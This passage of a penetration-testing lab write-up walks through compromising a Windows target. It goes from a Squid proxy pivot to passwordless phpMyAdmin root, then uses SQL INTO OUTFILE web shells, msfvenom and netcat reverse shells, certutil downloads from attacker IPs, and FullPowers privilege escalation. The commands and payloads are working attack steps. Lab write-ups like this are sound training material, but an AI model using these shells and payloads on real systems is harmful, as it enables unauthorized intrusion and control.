==SMB==
Right away I notice that `445 - SMB` seems to be open which is on the top of my priorities for Windows machines. I go ahead and investigate it using various tools.

Since I was not able to get an anonymous session I tried one of the other ports first to gain more information on possible creds.


## 3128/TCP - HTTP

I went to the website and found the following page:

![](../../../assets/470c851498cd459a2920004f684fa2c4.png)

Nothing of great significance, however I did notice that it is running on `Squid 4.14`. So I decided to do some research:

![](../../../assets/5b3fa4600c8465119760721f25f7f487.png)

`Squid` appears to be a HTTP web proxy service thatwe can try and abuse. According to [this](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid) blog I tried to use `curl -x` to set the port as the proxy and try to reach the host that way:

![](../../../assets/e540a7195a1530d657fa80cb669d6ac1.png)

![](../../../assets/11921b5d2eaf220c4e97361c03adf3b5.png)

Unfortunately that did not work so I had to try something else. Scrolling down on the same blog post I find the following:

![](../../../assets/afc564a25c3454c95b613ea6afd158e0.png)

I went ahead and downloaded the `spose.py` scanner to my attacker host from [here](https://github.com/aancw/spose).
I then ran it against the host and waited for the results:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 spose.py --proxy http://192.168.217.189:3128 --target 192.168.217.189
```

And got the following results:

![](../../../assets/88951ea052c5b6c7fd081695c31edffc.png)

2 new open ports have been found!

```
3306
8080
```

After using `curl` once more I found the following juicy info:

![](../../../assets/4ef8d7bba00991c12a0386df32e4f35e.png)

It seemed to work! Amidst the response there was also the following:

```html
<h2> Server Configuration </h2>
                <dl class="content">
                        <dt>Apache Version:</dt>
                            <dd>2.4.46&nbsp;&nbsp;-&nbsp;<a href='http://httpd.apache.org/docs/2.4/en/'>Documentation</a></dd>
                        <dt>Server Software:</dt>
                            <dd>Apache/2.4.46 (Win64) PHP/7.3.21&nbsp;-&nbsp;Port defined for Apache: </dd>
                        <dt>PHP Version:</dt>
                            <dd>7.3.21&nbsp;&nbsp;-&nbsp;<a href='http://www.php.net/manual/en/'>Documentation</a></dd>
```

It seems to be running an `Apache 2.4.46` server on port `8080`. Furthermore it also seems to be running a `MySQL` server on port `3306` according to the following lines:

```html
<dt>MySQL Version:</dt>
        <dd>5.7.31&nbsp;-&nbsp;Port defined for MySQL: 3306&nbsp;-&nbsp;
```

I got the version as well as port for it. I now had to prioritize which port I was going to investigate first.

I decided to go with the `MySQL` port first and found [the following info](https://www.exploit-db.com/exploits/40678) on this and other versions:

![](../../../assets/877aa802652ed633b7235624df014f6f.png)

This looks promising but we'd need a way to upload it first. So I settled on changing my `proxy`
settings via `FoxyProxy` to the target IP so I could go ahead and access port `8080`.


## 8080/TCP - HTTP (Proxy)

I changed the proxy settings like so:

![](../../../assets/277c7288760b3a587858c9fd42cd5958.png)

And then went to the `target_ip:8080`:

![](../../../assets/192be61da80f78ad52d493a287a5c817.png)

Just like that I got access!

I clicked on the `phpmyadmin` in the **Tools** tab on the bottom left and got the following screen:

![](../../../assets/fed41d13dce0c99957815db2c35e9985.png)

I tried some cred combo's until I was able to login with just `root` and no password:

![](../../../assets/a3d4221eba66c3f285c4da4f43287cd1.png)

I also found more users with the **User accounts** tab:

![](../../../assets/e648686b69f5876ac391c9c27feb8af7.png)

>[!danger]
>Squid, acting as a *reverse proxy*, allows unauthenticated access to an internal Wamp server and PhpMyAdmin interface. The PhpMyAdmin interface is configured with *passwordless* login for the root user, allowing an attacker to create files in the web root, which can lead to code execution.


==SQL Injecting Payload==
From here we can thus go ahead and try to upload a reverse shell via the interface. I found a SQL query matching our description:

![](../../../assets/3c46a590e0ff415c832a4d3c3e0288ec.png)

```sql
SELECT
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

After using this query we should be able to upload our reverse shell into it.

![](../../../assets/d622d14ad547b4a1720c1a33b1a026e0.png)

After clicking **Go** I then went ahead to the `http://target_ip:8080/uploader.php` page:

![](../../../assets/fd3f5b742ede6cdae7d3243d7a75de62.png)

I now could go ahead and upload any reverse shell, I will use the `pentestmonkey` shell in this case:

![](../../../assets/c7d9cccc8e152b5e886fd7ee9b8d0daa.png)

![](../../../assets/91a5c33f52baf1613ef5037f76faed2d.png)

Simultaneously I start up my listener:

```bash
nc -lvnp 1234
```

Unfortunately enough I ran into an error when going to the `/php-reverse-shell.php` endpoint:

![](../../../assets/38f6b35649295454756dfdaed60ed25b.png)

![](../../../assets/8452c059108dfd546acc76eab91e7c9e.png)

>[!bug]
>I did see a response in my own terminal, meaning I did receive a connection. I just need to upload a different shell for this to work properly.

```bash
msfvenom -p php/reverse_php LHOST=192.168.45.234 LPORT=1234 -f raw -o shell.php
```

![](../../../assets/9160e86cb4f376017131f8f313a5f0d4.png)

Now I went ahead and uploaded this shell again to the `/uploader.php` endpoint:

![](../../../assets/2e45b4e1a27646171c41b7707118214e.png)

This time I in fact did see a response!

==Stabilize Shell==
Unfortunately enough the shell gets dropped after some time, meaning we need to find a way to stabilize it so it stays up. I had to look externally to find some knowledge on how to do this.

I took the following steps:

```bash
1. Copy over nc.exe to current dir

┌──(kali㉿kali)-[~]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .

2. Copy over smbserver.py to current dir

┌──(kali㉿kali)-[~]
└─$ cp /usr/share/doc/python3-impacket/examples/smbserver.py .

3. Run smbserver.py with random creds to server up file after afterwards

┌──(kali㉿kali)-[~]
└─$ python smbserver.py -smb2support -username evil -password evil evil $PWD
```

![](../../../assets/5e3998fb3ffbefa90c55e83b8a2d4f49.png)

I left this terminal running.

I then went ahead and started another listener:

```bash
nc -lvnp 1235
```

Now I quickly went ahead through the upload again and issued the following commands from the terminal which got the **FIRST** reverse shell:

```powershell
net use z: \\192.168.45.234\evil /user:evil evil

Z:\nc.exe 192.168.45.234 1235 -e cmd.exe
```

I then got the connection in my other terminal on port `1235` aka my **SECOND** shell.

![](../../../assets/702ee8a164bce40cd4c95e3738b69e57.png)

In the `smbserver.py` terminal I was able to follow the whole execution method:

![](../../../assets/ea997912df6d968bf7f9ac3c7f3be062.png)

I would now only have to use the `1235` terminal to issue commands.

==local.txt==
This one was found in the directory that I landed in.

No unusual localgroups at first glance.

Unfortunately enough the enumeration yielded no specific caveats for me.


# Priv Esc

The only interesting thing I had found is the account I'm logged in as:

```
nt authority\local service
```

I tried to look up how to escalate privileges as that account:

![](../../../assets/a2d81da764b9fdedb4484d5dddff0c73.png)

As well as the [following blog](https://itm4n.github.io/localservice-privileges/):

![](../../../assets/bdd72a36a74a24d5a96012400780e4e0.png)

After skimming through the blog I found this at the bottom:

![](../../../assets/84085f076e9f9ca3c7c72dad5875eec8.png)

The writer made a PoC according to this vulnerability:

![](../../../assets/4a62f4010e6ca181b76e0ec72e8d4241.png)


>[!Bug]
>For whatever reason I ran into some trouble using this method so instead I opted for another SQL query where I could issue commands from the URL bar.

==SQL Injection Payload Alt==
I entered the following query:

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
```


![](../../../assets/99fa126683a878a5b968504228d93af0.png)

```
shell1.php?cmd=certutil -urlcache -f http://192.168.45.230:8001/nc.exe nc.exe
```

![](../../../assets/84d030578755de3a149502fb14bb75db.png)

![](../../../assets/6d8db6d94e177fec3d37710ed5634f52.png)

![](../../../assets/466bbab53d41918628897351e3bdada5.png)

This basically gave me the exact same shell as `nt authority\local service`. I now still had to do the same basically as before. 

>[!note]
>Target_IP and host_IP can vary because of multiple restarts from different computers.

I created a nested reverse shell in case one of them died (ctrl + c):

![](../../../assets/14801d99e395d31c3f5b4a279c011fed.png)

Now I still had to change my privileges again to **system** in order to fully exploit the target.

So I went ahead and downloaded the `FullPowers` zip file from [the github page](https://github.com/itm4n/FullPowers) and went ahead and loaded it onto the target:

![](../../../assets/9cf889eb9f883feec6ed1bbd03e4c44f.png)

```powershell
certutil -urlcache -f http://192.168.45.230:80/FullPowers.exe FullPowers.exe
```

![](../../../assets/d574e2cbbf0cb07c0e1863fb2fe09ec0.png)

As per the instructions I then went ahead and Issued the command as follows:

```powershell
FullPowers.exe -x
```

![](../../../assets/83746f32a9f6c2d8ee0694dac4cd4753.png)

Unfortunatelly that command did not work as expected as I did not get the correct privileges.

![](../../../assets/2ef123c37d44fad02d930075075f9506.png)

I instead opted for another command which DID give me the correct privileges:

```powershell
FullPowers.exe -c "powershell -ep Bypass"
```

![](../../../assets/5fbe23c499c42b546e840336a490f5a0.png)

I now have so called **impersonation privileges** but I still do **NOT** have **system** privileges. 
Meaning I still did not have access to the flag:

![](../../../assets/4866c5e23a401eef9fdcbac175efef16.png)

This meant that I had to dig even deeper.`

The important one to look at is the `SeImpersonatePrivilege` so I looked up how to go from that one to **SYSTEM**:

![](../../../assets/086306890653989864e36a6175c125cf.png)

Here I found multiple so called `potatoes` as well as yet another blog by [itm4n](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) which I checked out:
